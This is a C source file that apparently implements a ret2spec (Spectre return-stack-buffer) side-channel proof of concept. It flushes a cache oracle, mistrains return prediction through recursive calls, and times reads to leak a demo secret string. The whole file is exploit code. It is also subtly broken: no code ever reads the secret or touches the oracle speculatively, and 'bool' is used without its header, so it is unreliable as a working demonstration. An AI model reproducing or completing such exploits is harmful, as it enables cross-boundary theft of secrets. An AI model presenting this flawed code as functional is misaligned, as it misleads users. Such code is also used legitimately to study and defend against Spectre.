// Combined ret2spec C file
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "measurereadlatency.h"

// Cache line and page size
#define CACHE_LINE_SIZE 64
#define PAGE_SIZE 4096
#define ORACLE_SIZE 256
#define MAX_RUNS 100000
#define K_RECURSION_DEPTH 30

// Oracle byte array aligned to cache line
typedef struct {
    uint8_t byte[CACHE_LINE_SIZE];
} BigByte;

typedef struct {
    BigByte oracles_[ORACLE_SIZE];
} OracleArray;

// Global oracle
static OracleArray oracle;

// Global score tracker
static int scores[ORACLE_SIZE] = {0};

// Global leak target
extern const char *private_data;
size_t current_offset;

// Forward decl
void FlushDataCacheLineNoBarrier(const void *addr);
void MemoryAndSpeculationBarrier();
void ForceRead(const void *addr);

// Flush cache line range
void FlushFromDataCache(const void *start, const void *end) {
    const uintptr_t begin = (uintptr_t)start;
    const uintptr_t stop = (uintptr_t)end;
    for (uintptr_t p = begin; p < stop; p += CACHE_LINE_SIZE) {
        FlushDataCacheLineNoBarrier((const void*)p);
    }
    MemoryAndSpeculationBarrier();
}

// Oracle access and flush
void FlushOracle() {
    for (int i = 0; i < ORACLE_SIZE; ++i) {
        FlushDataCacheLineNoBarrier(&oracle.oracles_[i]);
    }
    MemoryAndSpeculationBarrier();
}

// Measure which oracle byte was cached
char RecomputeScores(char safe_char) {
    uint64_t latencies[ORACLE_SIZE] = {0};
    for (int i = 0; i < ORACLE_SIZE; ++i) {
        int mix_i = (i * 167 + 13) & 0xFF;
        latencies[mix_i] = MeasureReadLatency(&oracle.oracles_[mix_i]);
    }

    uint64_t safe_latency = latencies[(unsigned char)safe_char];
    int best = -1, best_score = 0;
    for (int i = 0; i < ORACLE_SIZE; ++i) {
        if (latencies[i] < safe_latency && i != (unsigned char)safe_char) {
            scores[i]++;
            if (scores[i] > best_score) {
                best_score = scores[i];
                best = i;
            }
        }
    }

    return (char)best;
}

// Recursive functions
bool false_value = 0;
void (*return_true_base_case)();
void (*return_false_base_case)();

char *stack_marks[256];
int stack_index = 0;

void ReturnsFalse(int depth) {
    if (depth > 0) {
        ReturnsFalse(depth - 1);
    } else {
        return_true_base_case();
    }
}

void ReturnsTrue(int depth) {
    char mark;
    stack_marks[stack_index++] = &mark;

    if (depth > 0) {
        ReturnsTrue(depth - 1);
    } else {
        return_false_base_case();
    }

    stack_index--;
    FlushFromDataCache(&mark, stack_marks[stack_index]);
}

// Main leakage logic
char Ret2SpecLeakByte() {
    for (int run = 0; run < MAX_RUNS; ++run) {
        FlushOracle();

        char mark;
        stack_marks[0] = &mark;
        stack_index = 1;
        ReturnsTrue(K_RECURSION_DEPTH);
        stack_index = 0;

        char leaked = RecomputeScores((char)(run & 0xFF));
        if (scores[(unsigned char)leaked] > 3) {
            return leaked;
        }
    }
    fprintf(stderr, "Failed to converge\n");
    exit(1);
}

// Return no-op for cross-callback
void NopFunction() {}
void ReturnsFalseStart() { ReturnsFalse(K_RECURSION_DEPTH); }

// Demo secret
const char *private_data = "It's a s3kr3t!!!";

// Main
int main() {
    return_true_base_case = NopFunction;
    return_false_base_case = ReturnsFalseStart;

    printf("Leaking secret: ");
    for (size_t i = 0; i < strlen(private_data); ++i) {
        current_offset = i;
        char c = Ret2SpecLeakByte();
        printf("%c", c);
        fflush(stdout);
    }
    printf("\nDone.\n");
    return 0;
}
